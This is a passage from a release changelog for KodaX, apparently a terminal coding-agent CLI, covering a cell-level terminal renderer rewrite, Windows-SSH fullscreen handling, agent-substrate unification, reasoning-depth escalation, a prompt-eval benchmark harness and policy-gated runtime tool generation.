`lastOutput = ''` pattern). Other `onRender` branches (debug / CI / screen-reader / fullscreen / has-static) are deliberately untouched in Phase 4 — Phase 5 expands cell coverage. KodaX-specific deviation: explicit first-render `\n` post-write at the call site (in `apply-cell-frame.ts`) realigns terminal cursor with `frame.cursor = (0, screen.height)` after `renderFullFrame` (which lands cursor at end-of-last-line); CC reference handles this implicitly inside its first-render path. **Code-review verdict: WARNING (0 CRITICAL, 0 HIGH, 2 MEDIUM, 2 LOW)** — all four addressed before merge: MEDIUM 1 (fullscreen first-render `\n` would scroll the terminal and drift `prevFrame.cursor`) gated with `frame.screen.height < frame.viewport.height` guard; MEDIUM 2 (`writeToStdout`/`writeToStderr`/`clear()` legacy-path writes leave `prevFrame` stale) added `invalidateCellFrame()` helper called after each of the three legacy call sites to reseed `prevFrame = emptyFrame(...)`; LOW 1+2 inaccurate comments fixed. 45 new substrate/ink tests (16 apply-diff + 10 output-to-screen + 11 renderer + 8 apply-cell-frame, the last includes the 2 viewport-fill tests added during the MEDIUM-1 fix); combined Phase 1-4 substrate test count: **192 tests**. Repo full suite: 372 files / 3773 tests + 23 todo, zero regressions caused by Phase 4 (1 known-flaky `tests/sa-refactor-goldens/selection.test.ts` real-corpus parsing test occasionally times out at 5s on slow Windows filesystem; pre-existing). TypeScript build clean.

- **FEATURE_057 Track F Phase 1 — Cell-level diff renderer typed skeleton (flag-gated)**: First of 6 phases for the cell-level diff renderer rewrite. Five new files under `packages/repl/src/tui/substrate/ink/`: `csi.ts` (pure CSI primitives), `osc.ts` (OSC 8 hyperlinks), `cell-screen.ts` (immutable cell-grid `Screen` + `cellAt` / `diffEach` / `shiftRows`), `frame.ts` (`Frame` / `Diff` / `Patch` / `shouldClearScreen`), `cell-renderer.ts` (`LogUpdate` class stub + `KODAX_TRACK_F=on` flag gate). Stub `render(prev, next)` returns empty diff so the flag-on path is deliberately blank (diagnosable) rather than partially rendered (would corrupt terminal). Zero behavioral change — legacy `log-update.js` remains the production renderer until Phase 6. 46 new unit tests pin the type contracts (csi: 12, osc: 6, cell-screen: 16, frame: 6, cell-renderer: 6). Naming: new file is `cell-renderer.ts` not `log-update.ts` because the legacy `log-update.js` co-exists in the same directory until retirement; TypeScript module resolution would conflict on shared basename.

- **FEATURE_057 Track F Phase 3 (3b + 3c) — Algorithm decisions + incremental main loop (still flag-gated)**: Phase 3 closes the algorithmic core of the cell-level renderer. **3b** introduces a new `viewport-state.ts` file with three pure decision functions: `computeViewportState(prev, next)` returns `{viewportY, cursorAtBottom, growing, shrinking, prevHadScrollback, nextFitsViewport}` with formulas annotated to CC reference lines (architect's "build viewportY fixtures before implementing" discipline followed); `shouldFullReset(prev, next)` returns the 4-case full-reset decision (resize / shrink-from-above-viewport / scrollback-cell-change / linesToClear-exceeds-viewport) with optional `trigger: {y, prevLine, nextLine}` debug info on scrollback hits; `shouldSkipDiff(removed, added, isEmptyAdded)` is the per-cell skip predicate (SpacerTail / empty-no-removed). 32 fixtures hand-traced against CC arithmetic. **3c** adds `renderIncremental(prev, next): Diff` to `cell-renderer.ts` — the main orchestrator that composes Phase 3a primitives with Phase 3b decisions: shrink → diffEach walk → grow rows → cursor restore. `LogUpdate.render()` routing now has 4 paths (non-TTY / first-render / full-reset / incremental). Two extracted helpers: `emitPatches` (zero-delta patch sequence) and `resetStyleAndHyperlink` (tracker reset). 5 integration tests cover steady-state cell change, growing/shrinking frames, resize reset, and scrollback-cell-change reset. Combined Phase 1-3c substrate test count: 143 tests. KodaX-specific deviations from CC: no `clearTerminal.debug` field (computed but not threaded through Patch shape yet), no `altScreen` / `decstbmSafe` parameters (DECSTBM optimization out-of-scope per design), no frame-timing instrumentation.

- **FEATURE_057 Track F Phase 3a — Cell-level write/cursor primitives (still flag-gated)**: Phase 3 was originally one phase; split into 3a (mechanical primitive ports, low risk) and 3b (algorithmic main loop, high risk) for independent review boundaries. 3a adds `writeCellWithStyleStr` (cell write with viewport-edge wide-char skip + wcwidth compensation + pending-wrap state), `moveCursorTo` (cursor positioning with `\r` reset for cross-row / pending-wrap cases), `renderFrameSlice` (row-range render using LF for cursor advancement so the viewport scrolls at the bottom margin, with unstyled-empty-cell skip), `readLine` (line read-back for `triggerY` debug info), `fullResetSequence_CAUSES_FLICKER` (full-screen reset fallback emitting `clearTerminal` + fresh full render). All primitives route mutation through `VirtualScreen.txn` (correctness + encapsulation > one closure-tuple-delta allocation per cell; Phase 6 may inline if profiling shows). 19 new tests pin the byte sequences (total 99 substrate tests). Zero regressions.

- **FEATURE_057 Track F Phase 2 — `renderFullFrame` + `VirtualScreen` skeleton + transition helpers (still flag-gated)**: Adds the first real rendering logic. `renderFullFrame(frame: Frame): Diff` walks the cell grid row-by-row, skips `SpacerTail` cells, emits hyperlink/SGR style transitions inline, returns a single `stdout` patch with lines joined by `\n` and trailing whitespace trimmed per line. `LogUpdate.render(prev, next)` now routes non-TTY and first-render (`prev.screen.height === 0`) to `renderFullFrame`; incremental case still returns `[]` (Phase 3 fills). New pure helpers: `transitionStyle` and `transitionHyperlink` return `{ patches, current }` — explicitly NOT accumulator-mutation style (Claude Code's reference mutates a passed-in array; KodaX's CRITICAL immutability rule forbids that pattern). `needsWidthCompensation(char)` flags emojis where terminal wcwidth tables disagree with Unicode (U+1FA70-1FAFF, U+1FB00-1FBFF blocks; multi-codepoint graphemes containing VS16). `VirtualScreen` class skeleton (Phase 3 cursor-state machine) ships with `cursor: Readonly<Point>` externally + `_cursorMut` internal handle so observers can't accidentally write to it from outside the class. New `SGR_RESET` constant in `csi.ts` (`\x1b[0m`). +34 tests in cell-renderer.test.ts (total 80 substrate tests). Code-review found 2 HIGH, 3 MEDIUM, 2 LOW — all actionable items addressed before merge (notably H2 immutability violation in `transition*` helpers refactored to pure functions).

- **FEATURE_096 — Windows-SSH ConPTY Host Auto-Downgrade to Main-Screen Policy** (originally planned `v0.7.39`, migrated into `v0.7.30` 2026-04-28 to land alongside FEATURE_057). New `remote_conpty_host` host profile in `TerminalRenderHost` union that detects `platform=win32 + (SSH_CONNECTION | SSH_CLIENT | SSH_TTY)` and routes the affected sessions to a main-screen policy (`enabled:false`, `mouseWheel/Clicks:false`, `streamingPreview:false`, `transcriptSpinnerAnimation:true`). Solves two layered platform issues: (1) Windows OpenSSH Server's ConPTY layer silently consumes VT mouse-tracking byte sequences before they reach the child process stdin, so KodaX's normal fullscreen + alt-screen path leaves users with broken mouse-wheel scroll while alt-screen bypasses the terminal's native scrollback; (2) Windows conhost's `SetConsoleCursorPosition` cursor-up viewport yank bug ([microsoft/terminal#14774](https://github.com/microsoft/terminal/issues/14774)) — when string-level `log-update` emits `cursor up + eraseLines` per frame and the cursor crosses the viewport's top edge, conhost yanks the user's view to the top of the scrollback buffer mid-stream, surfacing as the "repeated re-rendering" symptom. Affected users now keep the spinner + Banner + StatusBar + PromptFooter + BackgroundTaskBar through main-screen Ink rendering; live token streaming is intentionally disabled at main-screen (matches Claude Code's `hasCursorUpViewportYankBug`-gated `showStreamingText` policy in `c:/Works/claudecode/src/screens/REPL.tsx:1463`) and re-enabled once 057 Track F's absolute-cursor cell-level diff renderer lands. xtermjs check (VS Code Remote-SSH) runs first so VS Code Remote-SSH on Windows is not falsely downgraded.
- **`KODAX_FULLSCREEN` user-level escape hatch** (FEATURE_096): `KODAX_FULLSCREEN={1|0|未设}` three-state single variable lets users override automatic fullscreen decisions when the auto-downgrade judgement is wrong. `=1` short-circuits at the detect layer (Windows-SSH no longer routes to `remote_conpty_host`, falls through to its underlying host classification — typically `degraded_vt` — and gets fullscreen + mouse). `=0` forces every host into the main-screen + mouse-off + streaming/spinner-preserved policy regardless of detected host (user explicitly preferring terminal-native scroll). Naming is around the actual fullscreen decision rather than mouse control because mouse failure is a side-effect of leaving fullscreen, not the user's intent; an earlier `KODAX_DISABLE_MOUSE` design contained a dead state where `=1` meant "keep fullscreen but disable mouse" — alt-screen blocks terminal scrollback while the app no longer receives wheel events, so users with `=1` had no way to scroll at all.

- **FEATURE_060 Tier 2 — SSH transcript-resume perf (UUID-anchored 200-cap + useDeferredValue + transcript-mode 30-cap)** (commit `89c7dbb`): user-reported lag on `kodax -c` of long sessions over Windows-SSH — input took seconds to register, spinner refresh stuttered, entire history materialized untruncated. Root cause: KodaX wrapped Ink's `<Static>` around historical items (paint-once-to-scrollback semantics), but the one-time first-paint of N items is one giant `stream.write` to SSH/ConPTY; every spinner tick / keystroke triggered a full `buildTranscriptRenderModel` rebuild scaling O(N) on local CPU. KodaX had no count-based cap (only `MAX_VISIBLE_ROUNDS = 20` UX preference + `TRANSCRIPT_HARD_LINE_CAP = 100K` Tier 1 OOM safety). Three sub-changes mirror claude-code's production-tested non-virtualized pattern: (1) `computeTranscriptCapStart` + `TRANSCRIPT_RENDER_CAP = 200` + `TRANSCRIPT_RENDER_CAP_STEP = 50` UUID-anchored slice in `transcript-layout.ts` (immune to `collapseToolCalls` regrouping id churn, CC-1174; advances in 50-item steps to avoid per-append static block re-paint, CC-941; fallback clamps stored idx against `length - cap`); (2) `useDeferredValue` on `displayHistory` in `InkREPL.tsx` so spinner ticks + keystrokes get React's high-priority schedule while the heavy render-model rebuild runs on the low-priority track (mirrors CC's REPL.tsx:1318); (3) `TRANSCRIPT_MODE_VISIBLE_MESSAGES = 30` in transcript-mode when `showAllInTranscript` is off so the surface lands close to the active turn instead of buried under hundreds of historical rounds (mirrors CC's Messages.tsx:276). Note: claude-code's `VirtualMessageList` requires fullscreen `scrollRef` which is unavailable on Windows-SSH (FEATURE_096 auto-downgrades to main-screen) — so this cap-based fix is the correct mechanism for the affected environment, not a virtualization port. 10 new tests in `transcript-layout.test.ts` pin the anchor algorithm: under cap / at cap / at cap+step boundary / past cap+step advancement / append-within-step stability / id-vanish-with-list-over-cap fallback / id-vanish-with-list-under-cap returns 0 / shrunk-list clamp / empty list clears anchor / constant values match CC parity.

### Fixed

- **`outputToScreen` row-overflow crash** (commit `1b03275`, P0 hotfix): production crash on idle SSH session — `RangeError: setCellAt out of bounds: (148, 6) on 148x15` at `output-to-screen.ts:200` → `core/internals/renderer.js:63` → `core/engine.js:358`. Root cause: `Output.getGrid()` does NOT clamp writes to `width`. A write operation whose text extends past the right edge causes the row array to grow longer than `width` (JavaScript silently extends arrays via index assignment). The legacy `Output.get()` path tolerated this via `filter(undefined).trimEnd()` — overflow cells were dropped during string serialization. The new cell-renderer adapter `outputToScreen` iterated `row.length` instead of `width` and called `setCellAt(width, y, ...)`, which throws by design ("surface bugs early") and crashed the process. Phase 6 (this release) made the cell renderer the sole render path, so any overflow now hits this throw instead of being silently clipped. SSH sessions trip it more easily because terminal-width / Yoga-computed content-width disagreements expose the boundary cell. Fix at the adapter boundary (not at `setCellAt` — the throw is correct for grid-internal bugs): clamp the loop to `Math.min(row.length, width)` on x and `Math.min(grid.length, height)` on y. Two regression tests pin the invariant: a real `Output.write` with text longer than `width`, and a synthetic grid with `row.length > width`.

- **`engine.js setCursorPosition` defensive coordinate clamp** (commit `89c7dbb`): the setter previously stored the position verbatim into `this.cursorPosition`. Today nothing reads that field downstream (cell renderer derives cursor from `frame.cursor` instead), so an out-of-bounds value was harmless — but the comment explicitly anticipated future renderer-level IME wiring re-applying it. If that future caller routed the value through `setCellAt`, an out-of-bounds (x, y) would hit the deliberate `RangeError: setCellAt out of bounds` and crash the process (same class as the `1b03275` crash). Clamp at the storage boundary: `(x, y)` is clamped to `[0, columns-1] × [0, rows-1]`, undefined passes through, and a zero-dim terminal (mid-resize edge case) drops to undefined rather than storing a guaranteed-broken coordinate. Test: `engine.test.ts` "setCursorPosition clamps...".

- **`packages/repl/vitest.config.ts` workspace alias parity** (commit `6a01995`): running `npx vitest run` from `packages/repl/` failed at collection time on 18 test files with `Failed to resolve entry for package "@kodax/ai"` (and `@kodax/core`, `@kodax/mcp`, `@kodax/repointel-protocol`, `@kodax/session-lineage`). Root cause: when vitest is invoked from a sub-package directory it loads THAT package's `vitest.config.ts`, not the root one. The repl config aliased only 3 of 9 workspace packages — for everything else, vitest fell back to npm-workspace symlink resolution into `node_modules/@kodax/<pkg>/package.json`, whose `main` points to `dist/index.js`, which is absent without an explicit `tsc -b` build. Test files that don't directly import these packages still fail because `@kodax/coding`'s source pulls in `@kodax/ai` / `@kodax/core` / `@kodax/mcp` / `@kodax/repointel-protocol` / `@kodax/session-lineage` transitively, and the alias-resolved source path means vitest walks the full module graph through TS source. Fix: add aliases for every workspace package to both vitest configs (repl now aliases all 9 packages to their `src/index.ts`; root gains the 4 it was missing for parity). 18 failed files → 0 (121/121 pass, 959/959 tests in `packages/repl`; 372/373 + 1 pre-existing Windows timing flake at root). Documented the rationale + transitive-deps gotcha inline so the next contributor adding a workspace package registers an alias here.

---

## [0.7.29] - 2026-04-27

### Theme

SA / AMA substrate unification (Option Y deletion) + role-aware reasoning + prompt-eval foundation. KodaX's two top-level execution paths — `runKodaX` (single-agent) and `runManagedTaskViaRunner` (multi-agent Scout/Generator/Planner/Evaluator) — collapse onto a single declaration-borne substrate executor; legacy `agent.ts` shrinks from ~3000 lines to a 49-line `Runner.run` shim. Reasoning depth becomes a 5-tier resolution chain (user ceiling → agent default → Scout hint → Evaluator-revise escalate → user-followup escalate) replacing the flat single-mode model. New top-level `benchmark/` folder formalizes the prompt-evaluation discipline: any prompt content change must include a quality-only multi-run benchmark with persisted REPORT.md and per-category judge decomposition. Folder convention separates version-tracked artefacts (docs, datasets, harness code) from non-tracked run results.

### Added

- **FEATURE_100 — SA Runner Frame Adoption & Capability Unification**: Single-agent (`runKodaX`) and adaptive-multi-agent (`runManagedTaskViaRunner`) paths now share one substrate. Per ADR-020, the legacy "Option Y" facade (preset dispatcher registry that wrapped `runKodaX` so `Runner.run(defaultCodingAgent, …)` *appeared* SDK-native while the body stayed on the legacy path) is deleted: the substrate executor is attached directly to the Agent declaration via `Agent.substrateExecutor`, and `Runner.run` consults that field before any registry lookup. `agent.ts` collapses from a ~3000-line implementation to a 49-line shim that just calls `Runner.run(createDefaultCodingAgent(), prompt, { presetOptions: options })`; the old body is relocated to `agent-runtime/run-substrate.ts:runSubstrate` and exposed as the canonical executor closure. Five rounds of P3 sharding (P3.6g through P3.6v) extract per-CAP helpers, activate ~50 previously-stub `it.todo` contract tests, and drive AMA-shared CAP coverage from 3/13 → 17/17 (every Class-A capability now provably runs identically on both topologies). Closes the substrate drift FEATURE_080 (v0.7.23) deferred when "Option Y" originally landed.
- **FEATURE_078 — Role-Aware Reasoning Profiles (4-tier L1-L4 chain)**: `--reasoning <off|auto|quick|balanced|deep>` semantics shift from "all roles use this mode" to "ceiling + bias for default". Resolution chain: L1 user ceiling → L2 Agent declaration `reasoning` profile (default + max + escalateOnRevise) → L3 Scout `downstream_reasoning_hint` → L4 Evaluator-revise dynamic escalation (clamped by L1). New public API in `packages/coding/src/reasoning.ts`: `compareReasoningModes` / `clampReasoningMode` / `resolveRoleReasoning(role, userCeiling, profile?, scoutHint?)` / `escalateThinkingDepth(depth, ceiling?)`. Backward-compat preserved: when no Agent profile and no scout hint are supplied, the resolver collapses to the pre-FEATURE_078 single-mode answer. SA path gains an L2 anchor via `DEFAULT_CODING_REASONING_PROFILE` on `createDefaultCodingAgent`, restoring ADR-003 alignment (SA must have a role anchor). `--reasoningCeiling` accepted as a permanent alias of `--reasoningMode` (no breaking rename). 21 active unit tests pin the L1-L4 matrix.
- **FEATURE_103 — Scout calibration + L5 user-followup escalate**: Scout's reasoning profile recalibrated `default: quick → balanced` and `max: balanced → deep` (post-FEATURE_061 Scout is no longer a classifier — it judges H0/H1/H2 cascading topology, executes H0, emits `executionObligations[]`, and emits FEATURE_078 `downstream_reasoning_hint` meta-reasoning; the v0.7.16 "quick" default was vestigial). Adds **L5** to the FEATURE_078 chain: at task-edge entry (`runKodaX` and `runManagedTaskViaRunner`), the user's prompt is scanned for *doubt* markers (`不对` / `错了` / `are you sure` / `that's wrong` / etc., requires prior-assistant-turn to fire) or *deepen* markers (`仔细` / `深入` / `think harder` / `reconsider` / etc., fires on first turn too) and the L1 ceiling auto-bumps one rank (off stays off, deep stays deep). L5 + L4 jointly close the dissatisfaction-detection surface: L4 catches *system*-detected dissatisfaction (Evaluator returns `revise`), L5 catches *user*-detected dissatisfaction. Single-rank bump (never jumps to max — multi-round dissatisfaction can step `quick → balanced → deep` across calls). 30 active unit tests cover doubt + deepen dictionaries, escalation invariants, off-kill-switch, and identity-preserving option transform.
- **FEATURE_104 — Prompt-Eval Harness Module + Quantitative Benchmark + benchmark/ folder convention**: New top-level `benchmark/` directory formalizes prompt-evaluation discipline. Convention is split: `benchmark/README.md` + `benchmark/datasets/` (test cases + golden inputs) + `benchmark/harness/` (code modules) are **version-tracked**; `benchmark/results/` (run outputs, persisted as `<ISO-timestamp>/{results.json, REPORT.md, codes/, codes-index.json}`) is **NOT version-tracked** (`.gitignore` retains nothing — committing a snapshot is opt-in for regression baselines). The 8 user-supplied coding-plan provider/model short aliases land in `benchmark/harness/aliases.ts` (`zhipu/glm51` / `kimi` / `mimo/v25{,pro}` / `mmx/m27` / `ark/glm51` / `ds/v4{pro,flash}`) with `resolveAlias` + `availableAliases` helpers (skip when API key absent). Reusable judges (`mustContainAll/Any` / `mustNotContain` / `mustMatch/NotMatch` / `lengthWithin` / `parseAndAssert` / `runJudges`) carry a `JudgeCategory` (`format` / `correctness` / `style` / `safety` / `custom`) so reports decompose quality. Three usage patterns documented: `runOneShot` (single probe), `runABComparison` (lightweight pass/fail matrix), `runBenchmark` (decision-grade multi-run with variance + persisted markdown REPORT.md across 9 sections — run summary, methodology, score matrix, sub-dimensions, latency observed, variance, ranking, **assertion failure patterns sorted by frequency**, reproduction). KodaX-specific deviation from the LiveCanvas recipe: **quality is the only ranking metric** — coding-agent users tolerate near-arbitrary latency for a correct answer, so combining quality + speed into a composite would reward fast-wrong over slow-correct (latency tracked for diagnostics but never scored). 41 zero-LLM self-tests run in default `npm test` (no API cost) and pin alias verbatim shape, judge category aggregation, REPORT.md rendering, persistence round-trip, and the negative-space invariant that the harness module **does not** export `speedScore` / `DEFAULT_SPEED_*` / `DEFAULT_COMPOSITE_WEIGHTS`. Convention written into `docs/CLAUDE.md` so future contributors must include a benchmark when touching `system-prompt-*.ts` / `role-prompt.ts` / tool descriptions / `DEFAULT_CODING_INSTRUCTIONS` / protocol-emitter prompts; reasoning-depth-only changes (FEATURE_078 / 103) explicitly excluded.
- **CAP contract test suite — 100 files in `__contract-tests__/` activated**: ~50 previously-stub `it.todo` blocks across CAP-001 through CAP-098 activated as part of FEATURE_100 P3 sharding. Each CAP file now includes risk metadata, time-ordering constraints, and STATUS markers ("ACTIVE since FEATURE_100 P3.6X"). Active assertions cover SA + AMA topologies identically — the same substrate executor is asked the same question on both surfaces and must answer the same way. Reverse-audit grep gates (`legacy parity restore` / `inadvertently dropped` / `inadvertently lost` / `preserves SA semantic`) all read **0** at end of release: a regression detection net for any future drift between the two surfaces.

### Changed

- **`agent.ts` reduced from ~3000 lines to 49 lines** (FEATURE_100 P3.6r relocation): all reasoning + tool-loop + provider-payload + microcompact + middleware orchestration + cost tracking + extension events + provider-policy gate logic moved verbatim to `agent-runtime/run-substrate.ts:runSubstrate`. The legacy file is now a thin SDK wrapper: takes `(KodaXOptions, prompt)`, calls `Runner.run<KodaXResult>(createDefaultCodingAgent(), prompt, { presetOptions, abortSignal })`, asserts the substrate lifted `KodaXResult` onto `RunResult.data`, returns it. Behavioral parity verified by golden-trace replay across the contract-test suite. Re-exports for `buildAutoRepoIntelligenceContext`, `estimateProviderPayloadBytes`, `cleanupIncompleteToolCalls`, `saveSessionSnapshot`, etc. preserved so external callers see no API change.
- **Default coding agent declaration carries `substrateExecutor` + `middleware[] + reasoning` profile**: `createDefaultCodingAgent({...overrides})` now returns an Agent with three pre-populated declaration fields — `substrateExecutor` (the codingSubstrate closure that wraps `runSubstrate` and lifts the full `KodaXResult` onto `RunResult.data`), `middleware: DEFAULT_CODING_MIDDLEWARE` (autoReroute + mutationReflection + preAnswerJudge + postToolJudge, all enabled by default; substrate body honors the `enabled` flag when consulting the declaration), and `reasoning: DEFAULT_CODING_REASONING_PROFILE` (`{ default: 'balanced', max: 'deep', escalateOnRevise: true }` — matches AMA Generator/Planner profile). Replaces FEATURE_080 / v0.7.23 "Option Y" `registerPresetDispatcher` indirection: there is now a single canonical hook for the coding pipeline.
- **AMA Scout default reasoning raised to balanced/deep envelope** (FEATURE_103 calibration): Scout was `{ default: 'quick', max: 'balanced', escalateOnRevise: false }` — sized for the v0.7.16 classifier era. Now `{ default: 'balanced', max: 'deep', escalateOnRevise: false }`. `escalateOnRevise` stays false (Scout has no revise loop — emits `emit_scout_verdict` exactly once and hands off to Generator or Planner).
- **`KodaXOptions.reasoningMode` accepts `--reasoningCeiling` as alias** (FEATURE_078): both names parsed identically by `loadConfig`. No breaking rename — old configs and scripts continue to work; the new alias makes the L1 ceiling semantic explicit at the CLI surface for users who care.

### Fixed

- **DefaultCodingAgent's `instructions` no longer empty / no longer overridable**: `createDefaultCodingAgent` enforces `Partial<Omit<Agent, 'name' | 'instructions'>>` so callers cannot accidentally null out the instructions string the substrate body relies on. CAP-094 contract test (CAP-DEFAULT-AGENT-001a / 001b / 001c / 001d / 002 / 002b / 002c) pins this — frozen Agent + non-empty instructions + presence of `substrateExecutor` + `middleware[]` + `reasoning` + override-preservation invariants.
- **Reverse-audit grep gates: legacy parity comments cleared (FEATURE_100 P4)**: 13 `// legacy parity restore` comments scattered across `runner-driven.ts` (added in v0.7.26 as AMA was retrofitted to call `runKodaX`-style behavior) all removed in P4 cleanup. The reverse-audit grep gates that fail-CI on `legacy parity restore` / `inadvertently dropped` / `inadvertently lost` / `preserves SA semantic` substrings all read 0 hits at release.
- **Stale CLI / core / prompts test expectations refreshed** (commit `5f7050e`): test fixtures that drifted off the post-P3 substrate behavior updated to match — covers prompts golden snapshots, CLI argument-parsing expectations, and cross-package import shapes.

### Documentation

- **`docs/features/v0.7.29.md` design doc** — single-file design record covering FEATURE_100 (SA Runner Frame Adoption with full P1-P4 phased delivery plan, 5-layer assurance approach: capability inventory + golden trace + capability contract tests + dispatch eval baseline + reverse audit, plus 3 enhancements: known-missing-capability mining + contract-test-locks-capability-existence + reverse-audit-zero-hits) + FEATURE_078 (4-tier reasoning chain semantics + Agent declaration anchor migration) + FEATURE_103 (Scout calibration rationale + L5 design + KodaX-specific deviation from LiveCanvas recipe) + FEATURE_104 v1 + v2 (anti-pattern checklist mapping + module layout + folder version-tracking convention).
- **`docs/CLAUDE.md` adds Prompt Eval section** — explicit triggers (system-prompt-*.ts / role-prompt.ts / tool descriptions / DEFAULT_CODING_INSTRUCTIONS / protocol-emitter prompts), explicit non-triggers (FEATURE_078 / 103 reasoning-depth changes), folder layout (benchmark/{README, harness/, datasets/, results/}), and the run command (`npm run test:eval`).
- **`benchmark/README.md` convention guide** — full pattern catalog (Pattern 1 one-shot probe / Pattern 2 lightweight A/B / Pattern 3 quantitative benchmark with persistence), 6-step iteration workflow (read REPORT.md §8 → form hypothesis → edit ONE prompt section → smoke-test → full re-run → diff §3 + §8), statistical caveats baked in (n=3 default, ±10pp at this sample size, 3-point indistinguishability, latency reported but not scored).
- **`benchmark/datasets/README.md` dataset authoring guide** — directory layout convention (one folder per dataset with `case.ts` + README + optional fixtures/), what goes there vs. what doesn't.
- **`docs/features/v0.7.45.md` FEATURE_102 design doc landed** — Adaptive Multi-Provider Orchestration Runtime planned for v0.7.45 (4-phase route: telemetry/trace → review fan-out + objective arbiter → stage-level capability routing → fallback/health checks → data-driven adaptive). Provider switches happen at structured-output stage boundaries (not time boundaries) preserving prompt cache + tool-call protocol consistency. Document committed in this release; implementation is a future-version line item.
- **AGENTS.md + root CLAUDE.md consolidation**: agent-rules collapsed into a single root AGENTS.md so external contributors see the project conventions without spelunking docs/CLAUDE.md.
- **`docs/FEATURE_LIST.md`**: tracker count `101 → 103` (FEATURE_103 + FEATURE_104 added), "Current released version" pointer advanced to `v0.7.29`, FEATURE_078 / 103 / 104 / 102 narrative entries added with full design-rationale explanations.

---

## [0.7.28] - 2026-04-26

### Theme

Self-construction tier 2 — KodaX builds, statically audits, and activates runtime tools that the LLM uses immediately, no deploy. Standalone binary distribution via Bun --compile. Provider catalog refresh (DeepSeek V4, MiMo, Ark, kimi-code label collapse). Thinking-mode multi-turn replay hardened across providers. Construction lifecycle policy-gate ordering closed end-to-end.

### Added

- **FEATURE_087 + FEATURE_088 — Self-construction runtime + tool generation**: KodaX gains a four-segment lifecycle (`stage_tool` → `test_tool` → `activate_tool` → `revoke_tool`) for runtime-generated capabilities, with a Constructed-World tier living under `.kodax/constructed/<kind>s/<name>/<version>.json` that merges into the same registry as builtin tools (last-wins stack semantics). Tool generation is the first real consumer: Coding Agent emits a `ToolContent` (description + JSON Schema input + `capabilities.tools` allowlist + JS handler source string) which the runtime persists, statically audits (3 hard AST rules — no-eval / no-Function-constructor / require-handler-signature — plus optional LLM-review with `safe` / `suspicious` / `dangerous` verdicts plus Anthropic schema validation), then activates through a policy gate. Activated handlers run in-process (no V8 isolate / worker — single-user CLI threat model), receiving a `CtxProxy` that gates `ctx.tools.<name>` calls through the existing `executeTool` dispatch path so constructed handlers reuse every per-tool safety policy that ships with builtins (bash OS sandbox, write path policy, truncation, error mapping). Single-active-version per name with stack rollback when revoked. REPL surface binds an `askUser`-driven dialog policy for `'ask-user'` verdicts; non-REPL surfaces (CLI, ACP, child agents) default-reject so silent activation outside an interactive UI is impossible.
- **CLI direct dispatch + lifecycle subcommands for constructed tools**: `kodax <constructed-tool> [args...]` invokes a previously-activated constructed tool from the shell without opening the REPL — turns KodaX into an LLM-extensible CLI platform. `kodax tools list` / `kodax tools inspect <name>[@<version>]` / `kodax tools revoke <name>@<version>` cover inventory and lifecycle from the shell. Args map onto `inputSchema` via `--key=value` / `--key value` / `--flag` / single-positional → first-required-string-field, with type coercion driven by `inputSchema.properties[key].type` (string / integer / number / boolean + JSON fallback for arrays / objects). CLI bootstrap binds an `async () => 'reject'` policy so `activate` cannot succeed from this surface — direct dispatch is for *invoking* already-activated tools, not approving new ones. Reserved subcommand names (`skill`, `acp`, `completion`, `tools`) are guarded against constructed-tool name collision.
- **Standalone binary distribution via Bun `--compile`**: New `scripts/build-binary.mjs` produces self-contained executables for Windows / Linux x64+arm64 / macOS x64+arm64 under `dist/binary/<target>/` with a sidecar `builtin/` directory (skill assets that `KODAX_BUNDLED=true` resolves at runtime). Build-time defines bake `process.env.NODE_ENV='production'`, `KODAX_BUNDLED='true'`, and `KODAX_VERSION='<x.y.z>'` directly into the binary so `kodax --version` reports the source-of-truth version. Smoke-tested on win-x64: rehydrate of a pre-staged constructed tool + `kodax count_lines sample.txt` direct dispatch + `ctx.tools.read` builtin call all work end-to-end, proving `await import('file:///.../<version>.js')` ESM dynamic load functions inside a bun-compiled binary. README updated with installation guidance for the binary channel.
- **FEATURE_099 — Provider catalog refresh (DeepSeek V4 + kimi-code label collapse)**: DeepSeek V4 series wired in (`v4-flash` as the default + `v4-pro` as alternate); `kimi-code` model label collapses to a single `kimi-for-coding` (the upstream gateway routes to its own active model regardless of `model` field, so multiple labels were noise); deprecated `deepseek-chat` / `deepseek-reasoner` removed. Total provider count after this cycle: 13 (AnthropicCompat 6 + OpenAICompat 5 + CLI bridge 2).
- **FEATURE_098 — Per-model `contextWindow` / `maxOutputTokens` lookup at the wire layer**: `KodaXModelDescriptor.contextWindow` and `maxOutputTokens` had been declared in the type since FEATURE_078 but never read at runtime; the compaction trigger and wire-level `max_tokens` always used the provider-level fallback. This release threads the **active model's** descriptor through the compaction call sites (`packages/coding`, `packages/repl`) and the wire layer (`packages/ai/src/providers/{anthropic,openai}.ts`), so each request scales correctly to that model's published limits. Custom providers' `models[]` field upgraded to accept either a literal string or a `KodaXModelDescriptor` object (back-compat preserved). Pinned correct context windows for `kimi.k2.5` (256K — earlier 128K was a misreading of the Moonshot docs, corrected in `64785de`), `zhipu.glm-5-turbo` (128K), and the five ark-coding routes (`kimi-k2.5/k2.6` 256K, `minimax-latest` 204800, `doubao-seed-2.0-{code,pro,lite}` 256K). `compaction.contextWindow` config clarified in docs as a *manual override* — the per-model descriptor is the default source.
- **Volcengine Ark Coding Plan provider (`ark-coding`)**: New AnthropicCompat-route provider for the Ark gateway. Multi-model with **server-side routing by request `model` field** (distinguishes from `kimi-for-coding`, where the server ignores the model). 9 routes regression-tested with real upstream calls: `glm-5.1` / `glm-4.7` / `kimi-k2.6` / `kimi-k2.5` / `minimax-latest` / `deepseek-v3.2` / `doubao-seed-2.0-{code,pro,lite}`. Reuses `parseToolInputWithSalvage` and the rest of the existing AnthropicCompat stack — zero new transport code.
- **Xiaomi MiMo Token Plan provider (`mimo-coding`)**: New AnthropicCompat-route provider for MiMo Token Plan gateway. Wired through the standard provider stack including cost-rates, RST-prone list (servers in this family are known to require `tool_use` input salvage on partial JSON streams), and config example. Eval matrices (`coding-plan` provider eval, `identity-roundtrip` eval) cover it alongside the other AnthropicCompat coding-plan providers.
- **Tool_use input salvage unified across Anthropic-compat + OpenAI-compat paths**: Previously `parseToolInputWithSalvage` (recovery for partial / truncated `input_json_delta` streams that some upstream servers emit) lived in the Anthropic compat path only. OpenAI-compat providers had a separate, more naive parser. Unified at the wire layer so both paths recover from the same set of edge cases — relevant especially for the new MiMo / DeepSeek-V4 / Ark routes where partial-JSON behaviour was empirically observed.
